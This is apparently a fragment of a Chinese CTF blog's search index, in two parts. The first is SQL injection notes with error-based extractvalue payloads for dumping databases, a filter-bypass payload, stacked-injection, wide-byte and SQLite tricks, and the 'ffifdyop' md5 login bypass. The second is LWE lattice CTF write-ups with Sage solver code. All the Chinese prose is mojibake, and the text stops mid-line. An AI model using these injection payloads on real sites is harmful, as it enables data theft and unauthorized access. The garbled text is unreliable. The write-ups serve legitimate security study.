é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ ç›®å½• é€šè¿‡extractvalue()æˆ–updatexml()å‡½æ•° é€šè¿‡extractvalue()æˆ–updatexml()å‡½æ•°åœºæ™¯ å½“unionè¢«è¿‡æ»¤çš„æ—¶å€™ åŸç†extractvalue() :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°udatexml() :å¯¹XMLæ–‡æ¡£è¿›è¡Œæ›´æ–°çš„å‡½æ•°è¯­æ³•ï¼š extractvalue(æ–‡æ¡£ï¼Œè·¯å¾„) updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹) è·¯å¾„å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™å¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°æˆ‘ä»¬æƒ³å¾—åˆ°çš„å†…å®¹* å¸¸ç”¨payload1234æŸ¥æ•°æ®åº“åï¼šid='and(select extractvalue(1,concat(0x7e,(select database()))))çˆ†è¡¨åï¼šid='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))çˆ†å­—æ®µåï¼šid='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))çˆ†æ•°æ®ï¼šid='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME)))) ä¾‹é¢˜: buuctf æå®¢å¤§æŒ‘æˆ˜ hardsqlæƒ…æ™¯: order by union ç©ºæ ¼ and è¢«è¿‡æ»¤æŸ¥å­—æ®µåæ—¶å€™çš„payload:?username=44&amp;password=1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))%23 è¯»å–æ–‡ä»¶å †å æ³¨å…¥åœ¨æ­£å¸¸çš„è¯­å¥åé¢åŠ åˆ†å·( ; ),å¯é¡ºåºæ‰§è¡Œå¤šæ¡è¯­å¥, ä»è€Œé€ æˆæ³¨å…¥æ¼æ´.å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚ å †å æ³¨å…¥å¯ä»¥æ­é…ä¸€äº›è¯­å¥æ¥ç»•è¿‡å¯¹æŸäº›å…³é”®è¯çš„è¿‡æ»¤: 12345;show databases ------åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“;show tables ------åˆ—å‡ºæ‰€æœ‰è¡¨;show columns from table_name ------åˆ—å‡ºæŸä¸ªè¡¨çš„æ‰€æœ‰å­—æ®µ;desc table_name é€šè¿‡RENAMEæ›´æ”¹flagæ‰€åœ¨è¡¨åä¸ºé»˜è®¤æŸ¥è¯¢çš„è¡¨åæ›´æ”¹è¡¨å: rename table tbl_name to new_tbl_namealter table table_name to new name æ›´æ”¹åˆ—å alter table t_app change name app_name varchar(20) ç»•è¿‡æ–¹æ³•å®½å­—èŠ‚æ³¨å…¥åˆ©ç”¨ç¼–ç è½¬æ¢, å°†æœåŠ¡å™¨ç«¯å¼ºåˆ¶æ·»åŠ çš„æœ¬æ¥ç”¨äºè½¬ä¹‰çš„\\ç¬¦å·åƒæ‰, ä»è€Œèƒ½ä½¿æ”»å‡»è€…è¾“å…¥çš„å¼•å·èµ·åˆ°é—­åˆä½œç”¨, ä»¥è‡³äºå¯ä»¥è¿›è¡ŒSQLæ³¨å…¥. æ“ä½œå¦‚åœ¨è¿›è¡Œurl?id=1'ç­‰æ“ä½œæ—¶, å‘ç°æ— è®ºå¦‚ä½•éƒ½ä¸æŠ¥é”™, æˆ–è€…æŠ¥é”™äº†è«åå…¶å¦™çš„å¤šå‡ºäº†æœ‰, æ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨url?id=1%df', è¿™æ—¶æœåŠ¡ç«¯ä¼šåœ¨â€™å‰é¢æ·»åŠ ä¸€ä¸ª, \\çš„ASCIIç ä¸º0x5c, å› ä¸ºå‰é¢çš„%dfå¤§äº128, æœåŠ¡ç«¯ä¼šå°†0xdfå’Œ0x5cåˆå¹¶æˆ0xdf5cå³æ±‰å­— â€œè¿â€, ä»è€Œè¾¾åˆ°äº†ç»•è¿‡\\è½¬ä¹‰â€™çš„ç›®çš„ PHPé¢„å¤„ç†ä½¿ç”¨concat(char(num,num,num)) å³ä½¿ç”¨asciiç è½¬æˆå­—ç¬¦å†æ‹¼æ¥æ¥ç»•è¿‡å¯¹æŸäº›å…³é”®è¯çš„è¿‡æ»¤. SQLiteæ³¨å…¥ä¸sqlä¸åŒçš„æ˜¯, sqliteå°‘äº†ä¸€äº›å‡½æ•°, æ¯”å¦‚database()ç­‰ç­‰, è€Œä¸”å¦‚æœä½¿ç”¨äº†ä¸å­˜åœ¨çš„å‡½æ•°ä¹Ÿæ— æ³•çˆ†å‡ºåº“å.ä½†æ˜¯sqliteå­˜åœ¨ä¸€ä¸ªsqlite_masterè¡¨, é‡Œé¢çš„å­—æ®µä¸ºtype/name/tbl_name/rootpage/sqlå¯ä»¥é€šè¿‡æŸ¥è¯¢è¯¥è¡¨å†…ä¿¡æ¯å¾—åˆ°è¡¨å, å¹¶ä¸”å¯ä»¥é€šè¿‡sqlå­—æ®µå†…çš„sqlè¯­å¥å¾—åˆ°å¯¹åº”è¡¨å†…çš„å­—æ®µ ä¸€äº›å¥‡æ€ªçš„æ€»ç»“???jarvis oj - loginè¿™æ˜¯ä¸€é“è¦ç”¨ä¸‡èƒ½å¯†ç ç™»å½•çš„é¢˜sqlè¯­å¥æ˜¯: 1&quot;select * from `admin` where password='&quot;.md5($pass,true).&quot;'&quot; phpçš„md5()è¿™ä¸ªå‡½æ•°, å¯ä»¥æœ‰ç¬¬äºŒä¸ªå‚æ•°, å¦‚æœæ˜¯true, åˆ™å›è¿”å›åŸå§‹çš„äºŒè¿›åˆ¶æ•°æ®, ä¹Ÿå°±æ˜¯åŸæœ¬md5å‡ºæ¥çš„32ä½åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æˆçœŸæ­£çš„åå…­å­—èŠ‚çš„å­—ç¬¦ä¸².é‚£ä¹ˆè¿™é‡Œè¦ç™»å½•è¿›å», éœ€è¦æŠŠè¯­å¥æ„é€ æˆ: 12&quot;select * from `admin` where password=''or'1'&quot; # oråé¢çš„1å¯ä»¥æ¢æˆåˆ«çš„, åªè¦æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å°±å¥½äº† ç„¶åè¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå­—ç¬¦ä¸²ffifdyop, ä¸ºå•¥ç”¨è¿™ä¸ªå‘¢? å› ä¸ºå¦‚æœ$pass=ffifdyop, é‚£ä¹ˆè¯­å¥å°±ä¼šå˜æˆ 1&quot;select * from `admin` where password=''or'6'&quot; è¿™æ ·å°±èƒ½ç™»å½•å•¦","link":"/2020/09/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%8F%E9%AA%8C%E5%A4%A7%E6%9D%82%E7%83%A9/"},{"title":"The learning of LWE","text":"åšAnt&amp;d3çš„æ—¶å€™å‘ç°è‡ªå·±Latticeè¿˜ä¸ä¼š, æ‰€ä»¥å°±å»å­¦äº†ä¸€æ³¢Lattice, é¡ºä¾¿å°±äº†è§£äº†ä¸€ä¸‹LWE, å‘ç°è¿™ç©æ„å±…ç„¶æœ‰ä¸‰æ¬¡æ¯”èµ›ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªæ¿å­, ä¹Ÿæ¯ä¸ªéƒ½å»åšäº†åˆ†æäº†ä¸€ä¸‹, ç„¶åå°±é›†ä¸­åœ¨è¿™é‡Œäº†. æ„Ÿè°¢ä¸€ä½å¤§å¤§å¤§å¤§å¤§å¸ˆå‚…è¯¦ç»†çš„wpï¼Œæˆ‘æ‰èƒ½è¿™ä¹ˆå¿«çš„æ˜ç™½åŸç†ï¼ŒæŒ‡è·¯ â€”&gt; https://blog.soreatu.com/ X-NUCA Diamondé¢˜ç›®1234567891011121314151617181920212223242526272829303132#!/usr/bin/env sageimport osfrom hashlib import sha256from Crypto.Cipher import AESfrom sage.crypto.lwe import LWEfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler as DGDISfrom secret import FLAGassert FLAG.startswith(b&quot;X-NUCA{&quot;) and FLAG.endswith(b&quot;}&quot;)A = random_matrix(ZZ, 320, 5, x = 10, y = 1000)B = Matrix(A * vector([randint(1, 2^1024) for _ in range(5)]) for _ in range(7))L = LWE(n = 25, q = 1000, D = DGDIS(3))S = [L() for _ in range(64)]M = Matrix(64, 25, [int(i).__xor__(int(j)) for i,j in zip(A.list(), (Matrix([x for x, _ in S])).list())])T = Matrix([randint(1, 2^1024) for _ in range(64)])R = T.transpose().stack(T * vector([y for _, y in S]).change_ring(ZZ))if __name__ == &quot;__main__&quot;: key = sha256(''.join(list(map(str, L._LWE__s))).encode()).digest() iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) ct = cipher.encrypt(FLAG) f = open(&quot;output.txt&quot;, &quot;wb&quot;) f.write(str(B.list()).encode() + b'\\n') f.write(str(M.list()).encode() + b'\\n') f.write(str(R.list()).encode() + b'\\n') f.write((iv + ct).hex().encode()) f.close() ä¸€äº›æ–°è§åˆ°çš„å‡½æ•° random_matrix(ZZ, 5, 320, x = 10, y = 1000): éšæœºç”Ÿæˆä¸€ä¸ªæ•´æ•°çš„$320 \\cdot 5$çŸ©é˜µ, å…¶å…ƒç´ çš„å–å€¼èŒƒå›´æ˜¯$[x,y)$ä¹Ÿå°±æ˜¯$[10,1000)$ LWE(n = 25, q = 1000, D = DGDIS(3)): ç”Ÿæˆä¸€ä¸ª25ç»´ $mod \\ 1000$çš„LWEå¯¹è±¡ D - an error distribution such as an instance of DiscreteGaussianDistributionIntegerSampler stack(): åœ¨æœ«å°¾æ·»åŠ ä¸€è¡Œ é¢˜ç›®ä¸­ç»™å‡ºçš„ä¸€äº›æ¡ä»¶ é¦–å…ˆæ˜¯ä¸€ä¸ª320*5çš„çŸ©é˜µ$A$ï¼Œä¹˜ä¸Šäº†ä¸€ä¸ªéšæœºå˜æ¢çŸ©é˜µ5*7çš„çŸ©é˜µ$R$ï¼Œå¾—åˆ°äº†ä¸€ä¸ª320*7çš„çŸ©é˜µB ç„¶åæ˜¯ä¸€ä¸ªLWEï¼Œç”Ÿæˆäº†64ç»„æ•°æ®ï¼Œ$sâ‹…A_{lwe}+e=a$ï¼Œæ²¡æœ‰ç›´æ¥ç»™æˆ‘ä»¬$A_{lwe}$å’Œ$a$ã€‚åªç»™äº†$M=A{lwe}\\bigoplus A$ï¼Œä»¥åŠç”¨$s$ä½œä¸ºAESçš„keyï¼Œå¯¹flagè¿›è¡Œäº†åŠ å¯†ã€‚ å†å°±æ˜¯ä¸€ä¸ªknapsack problemï¼Œç”¨é•¿åº¦ä¸º64çš„å‘é‡$a$ä¸ä¸€ä¸ªå¦å¤–ä¸€ä¸ªå¾ˆå¤§çš„é•¿åº¦ä¸º64çš„éšæœºå‘é‡$T$ç›¸ä¹˜ï¼Œå¾—åˆ°ä¸€ä¸ªå¾ˆå¤§çš„æ•°$sum$ã€‚ç»™äº†$T$ä»¥åŠ$sum$ã€‚ knapsack problemè¿™é‡Œæœ‰ä¸€ä¸ªèƒŒåŒ…é—®é¢˜$$a_0T_0+a_1T_1+â€¦+a_{63}T_{63} = sum$$å…¶ä¸­å·²çŸ¥$T_0,T_1,â€¦,T_{63},sum$,è€Œä¸”$T_i$éå¸¸å¤§, $a_i \\le 1000$ , å¯ä»¥ç”±ä¸Šè¿°å¼å­æ„é€ æ ¼å­$$A=\\begin{pmatrix}1&amp;0&amp;\\cdots&amp;0&amp;T_0\\\\0&amp;1&amp;\\cdots&amp;0&amp;T_1\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;0&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;1&amp;T_{63}\\\\0&amp;0&amp;\\cdots&amp;0&amp;-sum\\end{pmatrix}$$åˆ™æœ‰$$\\begin{pmatrix}a_0,a_1,â€¦,a_{63},{1}\\end{pmatrix}\\begin{pmatrix}1&amp;0&amp;\\cdots&amp;0&amp;T_0\\\\0&amp;1&amp;\\cdots&amp;0&amp;T_1\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;0&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;1&amp;T_{63}\\\\0&amp;0&amp;\\cdots&amp;0&amp;-sum\\end{pmatrix}=\\begin{pmatrix}a_0,a_1,â€¦,a_{63},{0}\\end{pmatrix}$$å¯ä»¥çœ‹åˆ°$\\begin{pmatrix}a_0,a_1,â€¦,a_{63},0\\end{pmatrix}$æ˜¯å…¶ä¸­ä¸€ä¸ªæ ¼ç‚¹, è€Œä¸”éå¸¸çš„å°, å¯ä»¥å°è¯•ç”¨LLLå°†å…¶è§„çº¦å‡ºæ¥ 123456789101112R = [...]Lattice = [[0 for _ in range(65)] for _ in range(65)]for i in range(65): for j in range(65): if i==j and i!= 64: Lattice[i][j] = 1 if j== 64: Lattice[i][j] = R[i]Lattice[64][64] = -Lattice[64][64]Lattice = Matrix(Lattice)a = Lattice.LLL()[0][:-1]# (868, 798, 863, 260, 206, 550, 326, 908, 49, 50, 273, 528, 584, 569, 975, 261, 885, 680, 116, 33, 677, 664, 922, 178, 999, 336, 60, 655, 102, 438, 269, 754, 988, 124, 10, 380, 589, 382, 668, 623, 335, 845, 104, 117, 961, 917, 114, 590, 255, 26, 81, 846, 925, 548, 446, 796, 543, 997, 492, 651, 485, 137, 701, 247) æ¢å¤$A_{lwe}$è¿™éƒ¨åˆ†è¿˜æœ‰äº›ä¸æ˜ç™½,å…ˆæ”¾ç€ LWE$$s \\cdot A + e = a$$ å¯ä»¥å°†è¿™ä¸ªç­‰å¼ç†è§£æˆ$A$æ˜¯ä¸€ä¸ªæ ¼å­, $s$æ˜¯ä¸€ä¸ªçº¿æ€§ç»„åˆ, é‚£ä¹ˆ$b = s \\cdot A$æ˜¯ä¸€ä¸ªæ ¼ç‚¹, $e$æ˜¯è¯¯å·®, $a = b+e$æ˜¯ä¸€ä¸ªéæ ¼ç‚¹. LWEå°±æ˜¯è¦æ‰¾åˆ°è¿™ä¹ˆç¦»è¿™ä¸ªéæ ¼ç‚¹æœ€è¿‘çš„æ ¼ç‚¹. ä¹Ÿå°±æ˜¯CVPäº† å½“$s$çš„é•¿åº¦ä¸æ˜¯å¾ˆé•¿çš„æ—¶å€™, ä¹Ÿå°±æ˜¯è¯´ç»´åº¦æ¯”è¾ƒå°çš„æ—¶å€™, è¿™ä¸ªCVPè¿˜æ˜¯å¯ä»¥è§£å†³çš„, è€Œè¿™é‡Œ$s$çš„é•¿åº¦æ˜¯25, è§‚å¯Ÿä¸€ä¸‹LWEçš„å¼å­.$$s_0A_{i,0}+s_1A_{i,1}+â€¦+s_{24}A_{i,24} + e_i = a_i \\ (mod \\ p)$$ç†Ÿæ‚‰çš„é€ æ ¼å­å‰çš„å¥—è·¯, å°†å¼å­åŒ–ä¸º:$$s_0A_{i,0}+s_1A_{i,1}+â€¦+s_{24}A_{i,24} + k_ip + e_i= a_i$$é‚£ä¹ˆå¯ä»¥æ„é€ å‡ºç­‰å¼:$$s \\cdot L + e =(s_0,s_1,â€¦,s_{24},k_0,k_1,â€¦,k_{39})\\begin{pmatrix}A_{0,0}&amp;A_{1,0}&amp;\\cdots&amp;A_{39,0}\\\\A_{0,1}&amp;A_{1,1}&amp;\\cdots&amp;A_{39,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\A_{0,24}&amp;A_{1,24}&amp;\\cdots&amp;A_{39,24}\\\\p&amp;0&amp;\\cdots&amp;0\\\\0&amp;p&amp;\\cdots&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;p\\\\\\end{pmatrix}+(e_0,e_1,â€¦,e_{39})=(c_0,c_1,â€¦,c_{39})$$å…ˆå¯¹çŸ©é˜µ$L$è¿›è¡Œè§„çº¦, å¾—åˆ°ä¸€ä¸ªgood basis, å†ç”¨Babaiâ€™s algorithmæ±‚è§£CVPï¼Œå³å¯å¾—åˆ°ç¦»$a$æœ€è¿‘çš„æ ¼ç‚¹$b$ã€‚ æœ€åè§£æ–¹ç¨‹$A_{lwe} \\cdot s = b^{T} (mod \\ 1000)$ è§£å‡º$s$è¿™é“é¢˜åŸºæœ¬ä¸Šå°±åšå®Œäº† ä¸‹é¢æ˜¯Babaiâ€™s algorithmçš„æ¿å­ 12345678910111213141516171819def BabaisClosestPlaneAlgorithm(L, w): ''' Yet another method to solve apprCVP, using a given good basis. INPUT: * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * &quot;w&quot; -- a target vector to approach to. OUTPUT: * &quot;v&quot; -- a approximate closest vector. Quoted from &quot;An Introduction to Mathematical Cryptography&quot;: In both theory and practice, Babai's closest plane algorithm seems to yield better results than Babai's closest vertex algorithm. ''' G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - w æ€»çš„expå°±æ²¡å†™äº†, å…·ä½“çš„å¯ä»¥å‚ç…§ç€ä¸‹é¢ä¸¤é¢˜æ¥å†™, åæ­£éƒ½æ˜¯ä¸€ä¸ªæ¿å­çš„ 2020ç¥¥äº‘æ¯ Easy MatrixProblem1234567891011121314151617181920import numpy as npfrom secret import *def random_offset(size): x = np.random.normal(0, 4.7873, size) return np.rint(x)secret = np.array(list(flag))column = len(list(secret))row = 128prime = 2129matrix = np.random.randint(512, size=(row, column))product = matrix.dot(secret) % primeoffset = random_offset(size=row).astype(np.int64)result = (product + offset) % primenp.save(&quot;matrix.npy&quot;, matrix)np.save(&quot;result.npy&quot;, result) æ¡ä»¶è¯»å–äº†matrixåå°±å¯ä»¥çŸ¥é“column = 42 å°†flagè½¬æˆä¸€ä¸ª1*42çš„çŸ©é˜µ$secret$ æ¥çœ‹çœ‹è¿‡ç¨‹, å…ˆæ˜¯ç”Ÿæˆä¸€ä¸ª42*128 çš„éšæœºçŸ©é˜µ$matrix$, å…ƒç´ éƒ½$\\leq 512$ ç„¶åè®¡ç®—$product = matrix \\cdot secret \\ (mod \\ prime)$, ç»“æœåº”è¯¥æ˜¯ä¸€ä¸ª$1*128$çš„çŸ©é˜µ ç»§ç»­ç”Ÿæˆä¸€ä¸ª1*128éšæœºçŸ©é˜µ$offset$ æœ€åè®¡ç®—$result = (product + offset) \\ (mod \\ prime)$ é¢˜ç›®ç»™äº†$result$å’Œ$matrix$ åˆ†ææ¥çœ‹ä¸€ä¸‹åŠ å¯†çš„å¼å­$$R = S \\cdot M + e \\ (mod \\ p)$$æ˜¾ç„¶æ˜¯ä¸€ä¸ªLWE, ç°åœ¨å·²çŸ¥çš„æ˜¯$M$å’Œ$R$, è¦æ±‚$S$, å°†å¼å­å†™å…·ä½“$$R = (r_0,r_1,..,r_{127}) =(s_0,s_1,â€¦,s_{41})\\begin{pmatrix}m_{0,0}&amp;m_{1,0}&amp;\\cdots&amp;m_{127,0}\\\\m_{0,1}&amp;m_{1,1}&amp;\\cdots&amp;m_{127,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\m_{0,41}&amp;m_{1,42}&amp;\\cdots&amp;m_{127,41}\\end{pmatrix}+(e_0,e_1,â€¦,e_{41})(mod \\ p)$$ä¹Ÿå°±æ˜¯è¯´$$r_i = s_0m_{i,0} + s_1m_{i,1}+â€¦+s_{41}m_{i,41} + e_i (mod \\ p)$$ è€å¥—è·¯, æ”¹å†™æˆç­‰å¼æœ‰$$s_0m_{i,0} + s_1m_{i,1}+â€¦+s_{41}m_{i,41} + e_i + k_ip = r_i \\s \\cdot A + e = r$$ è§£å†³LWEå¯ä»¥æ„é€ æ ¼å­, ç„¶åç”¨LLLå’Œbabaiâ€™s nearest planeæ¥è§£å†³, ä¸‹é¢å°±æ ¹æ®ç­‰å¼æ„é€ æ ¼å­$$A=\\begin{pmatrix}m_{0,0}&amp;m_{1,0}&amp;\\cdots&amp;m_{127,0}\\\\m_{0,1}&amp;m_{1,1}&amp;\\cdots&amp;m_{127,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\m_{0,41}&amp;m_{1,42}&amp;\\cdots&amp;m_{127,41}\\\\p&amp;0&amp;\\cdots&amp;0\\\\0&amp;p&amp;\\cdots&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;p\\end{pmatrix}\\begin{pmatrix}p&amp;0&amp;\\cdots&amp;0\\\\0&amp;p&amp;\\cdots&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;\\cdots&amp;p\\\\m_{0,0}&amp;m_{1,0}&amp;\\cdots&amp;m_{127,0}\\\\m_{0,1}&amp;m_{1,1}&amp;\\cdots&amp;m_{127,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\m_{0,41}&amp;m_{1,42}&amp;\\cdots&amp;m_{127,41}\\\\\\end{pmatrix}\\\\$$ å®é™…ä¸Šåšçš„æ—¶å€™å³è¾¹çš„æ ¼å­æ‰æœ‰ç”¨, å·¦è¾¹çš„ä¸è¡Œ, å…·ä½“åŸå› æˆ‘ä¹Ÿæä¸æ¸…æ¥š, é—®äº†è€å¸ˆä¹Ÿæ²¡é—®å‡ºä»€ä¹ˆç»“æœ ç„¶åå°±å¯ä»¥ç”¨LLLæ ¼çº¦å‡ºgood basis å†ç”¨babaiâ€™s nearest planeè§£CVPäº† è§£å‡ºCVPä¹Ÿå°±æ„å‘³ç€æ‰¾åˆ°äº†$s \\cdot A = b$ä¸­çš„$b$ , $A$åˆæ˜¯å·²çŸ¥çš„, è§£æ–¹ç¨‹å³å¯ exp123456789101112131415161718192021222324252627282930313233343536373839404142import numpy as npfrom sage.modules.free_module_integer import IntegerLatticedef BabaisClosestPlaneAlgorithm(L, w): ''' Yet another method to solve apprCVP, using a given good basis. INPUT: * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * &quot;w&quot; -- a target vector to approach to. OUTPUT: * &quot;v&quot; -- a approximate closest vector. Quoted from &quot;An Introduction to Mathematical Cryptography&quot;: In both theory and practice, Babai's closest plane algorithm seems to yield better results than Babai's closest vertex algorithm. ''' G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - wrow = 128col = 42p = 2129M = Matrix(list(np.load('matrix.npy')))R = vector(list(np.load('result.npy')))A = [[0 for _ in range(row)] for _ in range(row)]for i in range(128): for j in range(128): if i==j: A[i][j] = pA = Matrix(A)L = Matrix(A.stack(M.transpose()))lattice = IntegerLattice(L, lll_reduce=True)closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)FLAG = Matrix(Zmod(p), M)flag = FLAG.solve_right(closest_vector)print(''.join( chr(i) for i in flag)) 2020çºµæ¨ªæ¯ babyLWEproblem1234567891011121314151617181920212223from sage.crypto.lwe import LWEfrom sage.stats.distributions.discrete_gaussian_integer \\ import DiscreteGaussianDistributionIntegerSampler as DGDISimport uuidFLAG = 'flag{' + str(uuid.uuid4()) + '}'FLAG = FLAG.encode().replace(b'-',b'')assert FLAG.startswith(b'flag{') and FLAG.endswith(b'}')s = list(FLAG[5:-1])n = len(s)q = random_prime(1&lt;&lt;512, proof=False, lbound=1&lt;&lt;511)lwe = LWE(n=n, q=q, D=DGDIS(1&lt;&lt;128))lwe._LWE__s = vector(Zmod(q), s)L = [lwe() for _ in range(2*n)]with open('task.txt', 'w') as f: _ = f.write(f&quot;q = {q}\\n&quot;) _ = f.write(f&quot;L = {L}\\n&quot;) åˆ†æå¤ªç¦»è°±äº†, ä¸€ä¸ªæ¿å­ä¸‰ä¸ªæ¯”èµ›ç”¨, è¿™é¢˜ç”¨çš„è¿˜æ˜¯X-NUCA Diamondçš„LWEçš„æ¿å­â€¦ä½†æ˜¯ä¸ºäº†å……åˆ†ç†è§£(å°±æ˜¯è¿˜æ²¡ç†è§£)LWEåˆ°åº•æ˜¯æ€ä¹ˆé€šè¿‡æ ¼å­è§£å‡ºæ¥çš„ å…ˆçœ‹çœ‹è¿™é¢˜é€ çš„æ ¼å­åŠ å¯†çš„å¼å­è¿˜æ˜¯$s \\cdot M + e = a \\ (mod \\ q)$, è¿™é‡Œçš„$s,M$é•¿åº¦32,ä¸€å…±64ä¸ªå¼å­è¿™é‡ŒåªçŸ¥é“$M$å’Œ$a$è¦æ±‚$s$, æ€è·¯éƒ½æ˜¯è®°$s \\cdot M = b $, $b$æ˜¯æ ¼å­$M$çš„ä¸€ä¸ªæ ¼ç‚¹, $a$æ˜¯æ ¼å¤–ä¸€ä¸ªç‚¹, é€šè¿‡å¯¹$M$è§„çº¦æ‰¾åˆ°$good \\ basis$ å†åˆ©ç”¨æœ€è¿‘å¹³é¢ç®—æ³•è§£å†³ä¸€ä¸ªCVP, ä¹Ÿå°±æ˜¯æ‰¾åˆ°ç¦»$a$æœ€è¿‘çš„å‘é‡, ä¹Ÿå°±æ˜¯$b$ æŠŠ$s \\cdot M = b \\ (mod \\ q)$å†è¯¦ç»†ç‚¹å°±æ˜¯$$s_0M_{i,0}+s_1M_{i,1}+â€¦+s_{31}M_{i,31} = b_i + k_iq\\\\s_0M_{i,0}+s_1M_{i,1}+â€¦+s_{31}M_{i,31}+ k_iq = b_i$$é‚£ä¹ˆé€ å‡ºæ¥çš„æ ¼å­åº”è¯¥æ˜¯ä¸‹é¢è¿™ä¸ªçŸ©é˜µ$$(s_0,s_1,\\cdots,s_{31},k_0,k_1,\\cdots,k_{63})\\begin{pmatrix}M_{0,0}&amp;M_{1,0}&amp;\\cdots&amp;M_{63,0}\\\\M_{0,1}&amp;M_{1,1}&amp;\\cdots&amp;M_{63,1}\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\M_{0,31}&amp;M_{1,31}&amp;\\cdots&amp;M_{63,31}\\\\q&amp;0&amp;\\cdots&amp;0\\\\0&amp;q&amp;\\cdots&amp;0\\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\0&amp;0&amp;0&amp;q\\end{pmatrix}=(b_0,b_1,\\cdots,b_{63})$$ å®é™…ä¸Šåšé¢˜çš„æ—¶å€™çŸ©é˜µæ˜¯ä¸Šé¢$p$ä¸‹é¢$M$çš„, ç„¶åè¿˜æœ‰å…³äºä¸ºä»€ä¹ˆè¦ç”¨64ç»„LWEçš„é—®é¢˜, æ ¹æ®æŸä¸ªå¤§ä½¬çš„åšå®¢, ç»„æ•°è¶Šå¤šè¶Šå¥½, æ‰€ä»¥åŸºæœ¬ä¸Šé¢˜ç›®ç»™äº†å¤šå°‘ç»„å°±ç”¨ä¸Šå¤šå°‘ç»„ é€šè¿‡å¯¹æ„é€ å‡ºæ¥çš„æ ¼å­è¿›è¡Œè§„çº¦å¾—åˆ°good basisç„¶åç”¨æœ€è¿‘å¹³é¢ç®—å‡º$(b_0,b_1,â€¦,b_{63})$å†è§£æ–¹ç¨‹$s \\cdot M = b \\ (mod \\ p)$å³å¯å¾—åˆ°$s$ exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from sage.modules.free_module_integer import IntegerLatticedef BabaisClosestPlaneAlgorithm(L, w): ''' Yet another method to solve apprCVP, using a given good basis. INPUT: * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * &quot;w&quot; -- a target vector to approach to. OUTPUT: * &quot;v&quot; -- a approximate closest vector. Quoted from &quot;An Introduction to Mathematical Cryptography&quot;: In both theory and practice, Babai's closest plane algorithm seems to yield better results than Babai's closest vertex algorithm. ''' G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - wq = 8934325385505568130914092337950620590424921674062792756625169144539462888362199042365894202712873706261308891694743761726859424971637596576879385466842113L = [...]n = 32Q = [[0 for _ in range(2*n)] for _ in range(2*n)]R = [0 for _ in range(2*n)]LL = [[0 for _ in range(n)] for _ in range(2*n)]for i in range(2*n): for j in range(n): LL[i][j] = L[i][0][j] M = Matrix(LL).transpose()for i in range(2*n): for j in range(2*n): if i == j: Q[i][j] = qfor i in range(2*n): R[i] = L[i][1]R = vector(R)L = Matrix(Q).stack(Matrix(M))lattice = IntegerLattice(L, lll_reduce=True)closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)FLAG = Matrix(Zmod(q), M.transpose())flag = FLAG.solve_right(closest_vector)print(''.join( chr(i) for i in 